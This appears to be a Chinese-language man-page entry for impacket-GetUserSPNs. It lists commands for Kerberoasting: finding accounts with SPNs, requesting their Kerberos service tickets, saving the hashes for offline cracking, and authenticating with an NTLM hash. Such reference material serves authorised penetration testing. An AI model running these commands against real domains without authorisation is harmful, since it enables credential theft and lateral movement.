# TAGLINE

查找拥有 SPN 的用户账户并请求其 Kerberos 服务票据

# TLDR

**查找可被 Kerberoasting 的账户**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip]```

**请求服务票据**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip] -request```

**输出到文件以便破解**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip] -request -outputfile [hashes.txt]```

**使用 NTLM 哈希**

```impacket-GetUserSPNs -hashes :[hash] [domain]/[user] -dc-ip [dc-ip]```

# SYNOPSIS

**impacket-GetUserSPNs** [_options_] _target_

# PARAMETERS

**-dc-ip** _ip_
> 域控制器 IP。

**-request**
> 请求 TGS 票据。

**-outputfile** _file_
> 将票据保存到文件。

**-hashes** _lm:nt_
> 使用 NTLM 哈希。

**-k**
> 使用 Kerberos 身份验证。

# DESCRIPTION

**impacket-GetUserSPNs** 查找拥有 SPN（服务主体名称）的用户账户并请求其 Kerberos 服务票据。属于 Impacket 工具集。用于 Kerberoasting 攻击，获取的 TGS 票据可以离线破解。仅限用于经授权的安全测试。

# INSTALL

```pacman: sudo pacman -S impacket```

<!-- packages: 2026-07-22 -->

# SEE ALSO

[impacket-gettgt](/man/impacket-gettgt)(1), [hashcat](/man/hashcat)(1)
